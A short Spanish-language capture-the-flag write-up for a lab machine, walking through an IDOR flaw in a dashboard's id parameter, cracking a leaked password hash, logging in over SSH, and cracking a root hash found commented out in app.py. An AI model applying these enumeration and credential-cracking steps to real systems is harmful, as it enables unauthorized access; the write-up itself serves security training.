## Reconocimiento:

Puerto 22 : SSH

Puerto 5000 : HTTP

En la web hay un panel de inicio de sesión con opción de registrarse, y al ingresar al panel del usuario creado podemos ver en la URL que nos asignan un número. Ahí es donde está la vulnerabilidad a juzgar por el nombre de la máquina:

```bash
http://172.17.0.2:5000/dashboard?id=55
```

Si lo voy cambiando encuentro 52 usuarios más, de los cuales interesa el usuario Aidor con el id 54.

```bash
http://172.17.0.2:5000/dashboard?id=54
```

En su panel podemos ver un hash que marca como contraseña. Uilizo Crackstation para crackearla:

```bash
7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
# info
chocolate
```

Pruebo como credencial SSH:

```python
aidor:chocolate
```

y funciona.

## Escalada

En la carpeta /home hay un script llamado app.py:

```python
.........................<RESTO DE CODIGO>.........................................
# Crear la base de datos y la tabla si no existen
def create_db():
    if not os.path.exists('database.db'):
        conn = get_db()
        cursor = conn.cursor()
        # Crear la tabla de usuarios si no existe
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            email TEXT NOT NULL
        )
        ''')
        # Insertar un usuario de ejemplo si la tabla está vacía
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        # if count == 0:
        #     cursor.execute('''
        #     INSERT INTO users (username, password, email) VALUES
        #     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
        #     ''')  # La contraseña "admin" es hash SHA-256
        conn.commit()
        conn.close()
.........................<RESTO DE CODIGO>.........................................
```

Se puede ver un hash con la contraseña de root:

```python
aa87ddc5b4c24406d26ddad771ef44b0
```

Lo crackeo:

```python
estrella
```

Listo.
